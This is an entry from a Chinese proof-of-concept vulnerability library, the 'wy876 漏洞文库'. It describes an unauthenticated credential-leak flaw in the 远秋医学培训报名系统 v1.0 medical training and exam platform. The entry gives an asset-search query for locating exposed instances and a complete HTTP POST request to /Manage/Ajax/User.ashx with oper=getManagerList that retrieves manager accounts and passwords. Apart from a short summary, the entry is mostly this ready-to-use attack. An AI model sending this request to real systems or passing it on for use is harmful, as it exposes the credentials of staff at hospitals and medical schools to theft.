---
source: "wy876 漏洞文库"
---

# 远秋医学培训报名系统User存在未授权账号密码泄露漏洞

# 一、漏洞简介
远秋医学在线考试系统采用通用的试题库管理软件，适用于各级各类医学院校和医院。远秋医学在线考试系统某接口存在未授权信息泄露漏洞，攻击者可利用该漏洞获取数据库敏感信息。远秋医学培训报名系统v1.0存在未授权访问漏洞，攻击者可通过漏洞获取登录密码。

# 二、影响版本
+ 远秋医学培训报名系统v1.0

# 三、资产测绘
```plain
title="医学在线考试系统"
```


# 四、漏洞复现
```java
POST /Manage/Ajax/User.ashx/ HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

oper=getManagerList&name=&code=&depart=&page=1&rows=15
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xp1atq8wl0rmv68n>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
